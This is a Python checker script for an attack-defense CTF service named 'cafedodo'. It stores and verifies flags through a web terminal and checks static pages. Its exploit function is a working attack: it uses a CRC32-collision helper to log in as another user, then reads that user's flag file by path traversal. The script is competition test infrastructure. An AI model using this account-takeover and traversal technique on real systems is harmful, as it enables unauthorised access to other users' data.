import secrets
from logging import LoggerAdapter

from enochecker3.chaindb import ChainDB
from enochecker3.enochecker import Enochecker
from enochecker3.types import (
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals
from httpx import AsyncClient
import base64

from noise import get_noise, get_random_noise
from util import (
    create_terminal,
    create_user,
    do_user_login,
    terminal_websocket,
    user_login,
)

checker = Enochecker("cafedodo", 6969)


def app():
    return checker.app


@checker.putflag(0)
async def putflag0(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    (username, password, port) = await create_user(client, db, logger)
    pid = await create_terminal(client, logger, username, password)
    flag = base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8")
    await terminal_websocket(
        task.address,
        logger,
        username,
        password,
        port,
        pid,
        [
            (f'echo "{flag}" > flagstore.txt && echo OK\n', ".*\nOK.*"),
        ],
    )

    return username


@checker.getflag(0)
async def getflag0(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    (username, password, port) = await user_login(client, db, logger)
    pid = await create_terminal(client, logger, username, password)
    flag = base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8").replace('+', '\\+')
    try:
        await terminal_websocket(
            task.address,
            logger,
            username,
            password,
            port,
            pid,
            [
                ("cat flagstore.txt\n", f".*\n{flag}.*"),
            ],
        )
    except TimeoutError:
        raise MumbleException("Flag was not found")


@checker.exploit(0)
async def exploit0(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    target_username = task.attack_info

    if target_username is None:
        raise MumbleException("No attack_info")

    logger.info("Exploit: " + target_username)

    response = await client.post(
        "http://cafedodo-crc32:3333",
        content=target_username,
        follow_redirects=True,
    )

    username = response.text

    if response.text == "":
        raise MumbleException("No CRC32 match")

    logger.info("Brute-forced username: " + username)

    password = secrets.token_hex(30)

    port = await do_user_login(client, logger, username, password)
    pid = await create_terminal(client, logger, username, password)
    response = await terminal_websocket(
        task.address,
        logger,
        username,
        password,
        port,
        pid,
        [
            (f"cat ../{target_username}/flagstore.txt\n", ".*ENOFLAGENOFLAG=.*"),
        ],
    )

    if flag := searcher.search_flag(response):
        return flag


@checker.putnoise(0)
async def putnoise0(
    task: PutnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    (username, password, port) = await create_user(client, db, logger)
    pid = await create_terminal(client, logger, username, password)
    (i, noise) = get_random_noise()
    await terminal_websocket(
        task.address,
        logger,
        username,
        password,
        port,
        pid,
        noise[0],
    )

    await db.set("noise_id", i)


@checker.getnoise(0)
async def getnoise0(
    task: GetnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    (username, password, port) = await user_login(client, db, logger)
    pid = await create_terminal(client, logger, username, password)

    i = await db.get("noise_id")

    if not isinstance(i, int):
        raise MumbleException("noise_id is not a int: " + str(i))

    noise = get_noise(i)
    await terminal_websocket(
        task.address,
        logger,
        username,
        password,
        port,
        pid,
        noise[1],
    )


@checker.havoc(0)
async def havoc0(
    task: HavocCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    assert_equals(
        (await client.get("/", follow_redirects=True)).status_code < 300,
        True,
        "Failed to get index.html",
    )
    assert_equals(
        (await client.get("/static/js/index.js", follow_redirects=True)).status_code
        < 300,
        True,
        "Failed to get index.html",
    )
    assert_equals(
        (await client.get("/static/css/style.css", follow_redirects=True)).status_code
        < 300,
        True,
        "Failed to get index.html",
    )
    assert_equals(
        (await client.get("/static/css/xterm.css", follow_redirects=True)).status_code
        < 300,
        True,
        "Failed to get index.html",
    )


if __name__ == "__main__":
    checker.run()
